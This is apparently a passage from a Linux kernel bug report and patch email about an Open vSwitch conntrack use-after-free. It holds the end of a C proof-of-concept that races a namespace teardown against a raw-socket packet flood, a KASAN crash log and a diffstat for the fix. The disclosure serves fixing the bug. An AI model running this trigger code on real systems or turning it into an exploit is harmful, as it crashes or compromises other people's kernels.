	frame.ip[15] = 1;
	frame.ip[16] = 10;
	frame.ip[19] = 2;
	frame.ip[2] = 0;
	frame.ip[3] = sizeof(frame) - ETH_HLEN;
	frame.udp[4] = 0;
	frame.udp[5] = 16;

	fd = socket(AF_PACKET, SOCK_RAW | SOCK_CLOEXEC, htons(ETH_P_ALL));
	if (fd < 0)
		return NULL;
	addr.sll_ifindex = if_nametoindex(PORT_NAME);
	while (!*ctx->stop && addr.sll_ifindex) {
		frame.ip[4] = (uint8_t)packet_id;
		frame.ip[5] = (uint8_t)(packet_id >> 8);
		frame.ip[10] = 0;
		frame.ip[11] = 0;
		frame.ip[10] = checksum(frame.ip, sizeof(frame.ip)) >> 8;
		frame.ip[11] = checksum(frame.ip, sizeof(frame.ip));
		frame.udp[0] = (uint8_t)(packet_id >> 8);
		frame.udp[1] = (uint8_t)packet_id;
		if (sendto(fd, &frame, sizeof(frame), 0,
			   (struct sockaddr *)&addr, sizeof(addr)) < 0 &&
		    (errno == ENODEV || errno == ENXIO || errno == ENETDOWN))
			break;
		packet_id++;
	}
	close(fd);
	return NULL;
}

static void flood_and_release(int go_fd)
{
	enum { THREADS = 4 };
	pthread_t threads[THREADS];
	struct flood_ctx ctx[THREADS];
	volatile int stop = 0;
	char go = 1;
	int i;

	for (i = 0; i < THREADS; i++) {
		ctx[i].stop = &stop;
		ctx[i].id = i;
		if (pthread_create(&threads[i], NULL, flood_thread, &ctx[i]))
			die_errno("pthread_create");
	}
	usleep(WARMUP_MS * 1000);
	if (write(go_fd, &go, 1) != 1)
		die_errno("release pipe");
	usleep(FLOOD_MS * 1000);
	stop = 1;
	for (i = 0; i < THREADS; i++)
		pthread_join(threads[i], NULL);
}

int main(void)
{
	int anchor_fd, genl, rtnl;
	int ready[2], go[2];
	pid_t child;
	char byte;

	enter_user_netns();
	anchor_fd = open("/proc/self/ns/net", O_RDONLY | O_CLOEXEC);
	if (anchor_fd < 0)
		die_errno("anchor netns");
	genl = nl_open(NETLINK_GENERIC);
	rtnl = nl_open(NETLINK_ROUTE);
	if (pipe(ready) || pipe(go))
		die_errno("pipe");

	child = fork();
	if (child < 0)
		die_errno("fork");
	if (child == 0) {
		close(ready[0]);
		close(go[1]);
		close(genl);
		close(rtnl);
		setup_victim(anchor_fd, ready[1], go[0]);
	}

	close(ready[1]);
	close(go[0]);
	if (read(ready[0], &byte, 1) != 1)
		die_errno("ready");
	while (!if_nametoindex(PORT_NAME))
		usleep(1000);
	set_up(rtnl, PORT_NAME);
	flood_and_release(go[1]);
	waitpid(child, NULL, 0);
	close(go[1]);
	close(ready[0]);
	close(genl);
	close(rtnl);
	close(anchor_fd);
	return 0;
}

------END PoC--------

----BEGIN crash log----

[Wed Mar 18 20:20:25 2026] [  T10321] BUG: KASAN: slab-use-after-free in ovs_ct_execute+0x1f1c/0x2100
[Wed Mar 18 20:20:25 2026] [  T10321] Read of size 4 at addr ffff888035c1f3e0 by task poc/10321

[Wed Mar 18 20:20:25 2026] [  T10321] CPU: 0 UID: 1028 PID: 10321 Comm: poc Not tainted 6.12.74 #3
[Wed Mar 18 20:20:25 2026] [  T10321] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[Wed Mar 18 20:20:25 2026] [  T10321] Call Trace:
[Wed Mar 18 20:20:25 2026] [  T10321]  <TASK>
[Wed Mar 18 20:20:25 2026] [  T10321]  dump_stack_lvl+0x10e/0x1f0
[Wed Mar 18 20:20:25 2026] [  T10321]  print_report+0xc6/0x620
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __phys_addr+0xcb/0x150
[Wed Mar 18 20:20:25 2026] [  T10321]  ? ovs_ct_execute+0x1f1c/0x2100
[Wed Mar 18 20:20:25 2026] [  T10321]  kasan_report+0xd8/0x110
[Wed Mar 18 20:20:25 2026] [  T10321]  ? ovs_ct_execute+0x1f1c/0x2100
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_ct_execute+0x1f1c/0x2100
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __kasan_slab_alloc+0x89/0x90
[Wed Mar 18 20:20:25 2026] [  T10321]  ? kmem_cache_alloc_noprof+0x126/0x2f0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_ovs_ct_execute+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  do_execute_actions+0xaab/0x7d60
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_do_execute_actions+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __asan_memcpy+0x3c/0x60
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __asan_memcpy+0x3c/0x60
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __skb_clone+0x575/0x760
[Wed Mar 18 20:20:25 2026] [  T10321]  ? hlock_class+0x4e/0x130
[Wed Mar 18 20:20:25 2026] [  T10321]  clone_execute+0x496/0x6d0
[Wed Mar 18 20:20:25 2026] [  T10321]  do_execute_actions+0x1de7/0x7d60
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? lock_acquire.part.0+0x119/0x370
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_do_execute_actions+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_lock_acquire.part.0+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? find_held_lock+0x2d/0x110
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? ovs_dp_process_packet+0x227/0x820
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_lock_release+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_execute_actions+0xf3/0x490
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_dp_process_packet+0x280/0x820
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_ovs_dp_process_packet+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __asan_memset+0x23/0x50
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __ovs_ct_update_key+0x3a9/0xdc0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_vport_receive+0x21d/0x370
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_ovs_vport_receive+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? trace_lock_acquire+0x145/0x1c0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? internal_dev_xmit+0x65/0x320
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? lock_acquire+0x2f/0xb0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? internal_dev_xmit+0x65/0x320
[Wed Mar 18 20:20:25 2026] [  T10321]  internal_dev_xmit+0xbe/0x320
[Wed Mar 18 20:20:25 2026] [  T10321]  __dev_direct_xmit+0x58f/0x730
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx___dev_direct_xmit+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? netdev_pick_tx+0x147/0xc80
[Wed Mar 18 20:20:25 2026] [  T10321]  packet_xmit+0x1ee/0x360
[Wed Mar 18 20:20:25 2026] [  T10321]  packet_sendmsg+0x2704/0x55c0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? find_held_lock+0x2d/0x110
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx___might_resched+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __sanitizer_cov_trace_switch+0x54/0x90
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? aa_sk_perm+0x2e6/0xb80
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_packet_sendmsg+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_aa_sk_perm+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  __sys_sendto+0x47e/0x4d0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx___sys_sendto+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? __pfx_lock_release+0x10/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  ? trace_lock_acquire+0x145/0x1c0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? rcu_is_watching+0x12/0xc0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? rcu_is_watching+0x12/0xc0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  __x64_sys_sendto+0xe5/0x1c0
[Wed Mar 18 20:20:25 2026] [  T10321]  ? do_syscall_64+0x93/0x250
[Wed Mar 18 20:20:25 2026] [  T10321]  ? srso_alias_return_thunk+0x5/0xfbef5
[Wed Mar 18 20:20:25 2026] [  T10321]  ? lockdep_hardirqs_on+0x7b/0x110
[Wed Mar 18 20:20:25 2026] [  T10321]  do_syscall_64+0xc7/0x250
[Wed Mar 18 20:20:25 2026] [  T10321]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[Wed Mar 18 20:20:25 2026] [  T10321] RIP: 0033:0x7f820deb59ee
[Wed Mar 18 20:20:25 2026] [  T10321] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
[Wed Mar 18 20:20:25 2026] [  T10321] RSP: 002b:00007f820de16dd8 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[Wed Mar 18 20:20:25 2026] [  T10321] RAX: ffffffffffffffda RBX: 00007f820de176c0 RCX: 00007f820deb59ee
[Wed Mar 18 20:20:25 2026] [  T10321] RDX: 000000000000003a RSI: 00007f820de16e70 RDI: 0000000000000005
[Wed Mar 18 20:20:25 2026] [  T10321] RBP: 000055bb787812d0 R08: 00007f820de16e50 R09: 0000000000000014
[Wed Mar 18 20:20:25 2026] [  T10321] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000001337
[Wed Mar 18 20:20:25 2026] [  T10321] R13: 0000000000000052 R14: 00007ffc21454830 R15: 00007f820d617000
[Wed Mar 18 20:20:25 2026] [  T10321]  </TASK>

[Wed Mar 18 20:20:25 2026] [  T10321] Allocated by task 10293:
[Wed Mar 18 20:20:25 2026] [  T10321]  kasan_save_stack+0x33/0x60
[Wed Mar 18 20:20:25 2026] [  T10321]  kasan_save_track+0x14/0x30
[Wed Mar 18 20:20:25 2026] [  T10321]  __kasan_kmalloc+0xaa/0xb0
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_ct_init+0xee/0x4d0
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_init_net+0x304/0x5b0
[Wed Mar 18 20:20:25 2026] [  T10321]  ops_init+0x1e4/0x600
[Wed Mar 18 20:20:25 2026] [  T10321]  setup_net+0x224/0x860
[Wed Mar 18 20:20:25 2026] [  T10321]  copy_net_ns+0x2ab/0x5e0
[Wed Mar 18 20:20:25 2026] [  T10321]  create_new_namespaces+0x3ef/0xae0
[Wed Mar 18 20:20:25 2026] [  T10321]  unshare_nsproxy_namespaces+0xc8/0x1f0
[Wed Mar 18 20:20:25 2026] [  T10321]  ksys_unshare+0x437/0xa10
[Wed Mar 18 20:20:25 2026] [  T10321]  __x64_sys_unshare+0x36/0x50
[Wed Mar 18 20:20:25 2026] [  T10321]  do_syscall_64+0xc7/0x250
[Wed Mar 18 20:20:25 2026] [  T10321]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[Wed Mar 18 20:20:25 2026] [  T10321] Freed by task 1492:
[Wed Mar 18 20:20:25 2026] [  T10321]  kasan_save_stack+0x33/0x60
[Wed Mar 18 20:20:25 2026] [  T10321]  kasan_save_track+0x14/0x30
[Wed Mar 18 20:20:25 2026] [  T10321]  kasan_save_free_info+0x3b/0x60
[Wed Mar 18 20:20:25 2026] [  T10321]  __kasan_slab_free+0x4f/0x70
[Wed Mar 18 20:20:25 2026] [  T10321]  kfree+0x14a/0x4a0
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_ct_exit+0x19c/0x270
[Wed Mar 18 20:20:25 2026] [  T10321]  ovs_exit_net+0xb3/0x9b0
[Wed Mar 18 20:20:25 2026] [  T10321]  ops_exit_list+0xb5/0x180
[Wed Mar 18 20:20:25 2026] [  T10321]  cleanup_net+0x5bc/0xb20
[Wed Mar 18 20:20:25 2026] [  T10321]  process_one_work+0x96d/0x1b60
[Wed Mar 18 20:20:25 2026] [  T10321]  worker_thread+0x647/0xe70
[Wed Mar 18 20:20:25 2026] [  T10321]  kthread+0x2b0/0x3a0
[Wed Mar 18 20:20:25 2026] [  T10321]  ret_from_fork+0x4a/0x80
[Wed Mar 18 20:20:25 2026] [  T10321]  ret_from_fork_asm+0x1a/0x30

[Wed Mar 18 20:20:25 2026] [  T10321] The buggy address belongs to the object at ffff888035c1f3e0
                                       which belongs to the cache kmalloc-32 of size 32
[Wed Mar 18 20:20:25 2026] [  T10321] The buggy address is located 0 bytes inside of
                                       freed 32-byte region [ffff888035c1f3e0, ffff888035c1f400)

[Wed Mar 18 20:20:25 2026] [  T10321] The buggy address belongs to the physical page:
[Wed Mar 18 20:20:25 2026] [  T10321] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x35c1f
[Wed Mar 18 20:20:25 2026] [  T10321] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
[Wed Mar 18 20:20:25 2026] [  T10321] page_type: f5(slab)
[Wed Mar 18 20:20:25 2026] [  T10321] raw: 00fff00000000000 ffff88801c042940 ffffea0000967490 ffffea000082b650
[Wed Mar 18 20:20:25 2026] [  T10321] raw: 0000000000000000 0000000000150015 00000001f5000000 0000000000000000
[Wed Mar 18 20:20:25 2026] [  T10321] page dumped because: kasan: bad access detected
[Wed Mar 18 20:20:25 2026] [  T10321] page_owner tracks the page as allocated
[Wed Mar 18 20:20:25 2026] [  T10321] page last allocated via order 0, migratetype Unmovable, gfp_mask 0x52800(GFP_NOWAIT|__GFP_NORETRY|__GFP_COMP), pid 5358, tgid 5358 (systemd-tmpfile), ts 75209207871, free_ts 75022619452
[Wed Mar 18 20:20:25 2026] [  T10321]  post_alloc_hook+0x2ea/0x350
[Wed Mar 18 20:20:25 2026] [  T10321]  get_page_from_freelist+0x7af/0x3990
[Wed Mar 18 20:20:25 2026] [  T10321]  __alloc_pages_noprof+0x22b/0x26d0
[Wed Mar 18 20:20:25 2026] [  T10321]  alloc_pages_mpol_noprof+0x2ce/0x610
[Wed Mar 18 20:20:25 2026] [  T10321]  new_slab+0x2e5/0x420
[Wed Mar 18 20:20:25 2026] [  T10321]  ___slab_alloc+0xe60/0x19e0
[Wed Mar 18 20:20:25 2026] [  T10321]  __slab_alloc.isra.0+0x5b/0xb0
[Wed Mar 18 20:20:25 2026] [  T10321]  __kmalloc_cache_noprof+0x2b9/0x300
[Wed Mar 18 20:20:25 2026] [  T10321]  kmem_cache_free+0x2d3/0x490
[Wed Mar 18 20:20:25 2026] [  T10321]  __fput+0x68b/0xb60
[Wed Mar 18 20:20:25 2026] [  T10321]  __fput_sync+0x4a/0x60
[Wed Mar 18 20:20:25 2026] [  T10321]  __x64_sys_close+0x8b/0x100
[Wed Mar 18 20:20:25 2026] [  T10321]  do_syscall_64+0xc7/0x250
[Wed Mar 18 20:20:25 2026] [  T10321]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[Wed Mar 18 20:20:25 2026] [  T10321] page last free pid 5359 tgid 5359 stack trace:
[Wed Mar 18 20:20:25 2026] [  T10321]  free_unref_page+0x6e8/0x1020
[Wed Mar 18 20:20:25 2026] [  T10321]  tlb_finish_mmu+0x284/0x830
[Wed Mar 18 20:20:25 2026] [  T10321]  exit_mmap+0x3e4/0xb40
[Wed Mar 18 20:20:25 2026] [  T10321]  __mmput+0x12a/0x4c0
[Wed Mar 18 20:20:25 2026] [  T10321]  mmput+0x67/0x70
[Wed Mar 18 20:20:25 2026] [  T10321]  do_exit+0x969/0x2ce0
[Wed Mar 18 20:20:25 2026] [  T10321]  do_group_exit+0xda/0x2a0
[Wed Mar 18 20:20:25 2026] [  T10321]  __x64_sys_exit_group+0x43/0x50
[Wed Mar 18 20:20:25 2026] [  T10321]  __pfx___do_sys_ni_syscall+0x0/0x10
[Wed Mar 18 20:20:25 2026] [  T10321]  do_syscall_64+0xc7/0x250
[Wed Mar 18 20:20:25 2026] [  T10321]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[Wed Mar 18 20:20:25 2026] [  T10321] Memory state around the buggy address:
[Wed Mar 18 20:20:25 2026] [  T10321]  ffff888035c1f280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[Wed Mar 18 20:20:25 2026] [  T10321]  ffff888035c1f300: fc fc fc fc 00 00 00 00 fc fc fc fc fc fc fc fc
[Wed Mar 18 20:20:25 2026] [  T10321] >ffff888035c1f380: fc fc fc fc fc fc fc fc fc fc fc fc fa fb fb fb
[Wed Mar 18 20:20:25 2026] [  T10321]                                                        ^
[Wed Mar 18 20:20:25 2026] [  T10321]  ffff888035c1f400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[Wed Mar 18 20:20:25 2026] [  T10321]  ffff888035c1f480: fc fc fc fc 00 00 00 00 fc fc fc fc fc fc fc fc
[Wed Mar 18 20:20:25 2026] [  T10321] ==================================================================
[Wed Mar 18 20:20:25 2026] [  T10321] Kernel panic - not syncing: KASAN: panic_on_warn set ...

-----END crash log-----

Best regards,
Yuqi Xu

 net/openvswitch/conntrack.c | 120 ++++++++++++++++++++++++------------
 net/openvswitch/conntrack.h |   6 +-
 net/openvswitch/datapath.c  |  10 ++-
 net/openvswitch/datapath.h  |   8 ++-
 4 files changed, 98 insertions(+), 46 deletions(-)

base-commit: 746fc0787f616da418ffc04a110296fe95d53491
